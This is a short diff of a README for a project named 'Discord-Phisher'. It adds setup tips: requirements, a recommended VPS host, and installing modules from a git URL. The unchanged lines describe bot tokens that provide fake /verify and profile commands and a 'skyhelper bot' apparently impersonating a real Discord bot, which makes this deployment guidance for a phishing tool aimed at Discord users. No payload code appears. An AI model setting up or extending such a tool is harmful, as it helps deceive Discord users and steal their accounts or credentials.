@@ -1,5 +1,5 @@
 # Discord-Phisher
-
+# Must have pip, python and git. vultr is recomended vps
 
 # Bot token is for /verify /premium and /view profile
 # Gen token has /webhook and /start so it would be your skyhelper bot
@@ -17,7 +17,7 @@ After the bots start you must type .sync in a channel where both bots can see an
 
 Bot made by dumbpengu2 ! 318865182182998019
 
-
+if you have problems with modules try installing them with git. using pip install -U git+replacewithrepolink.git
 
 Errors:
 
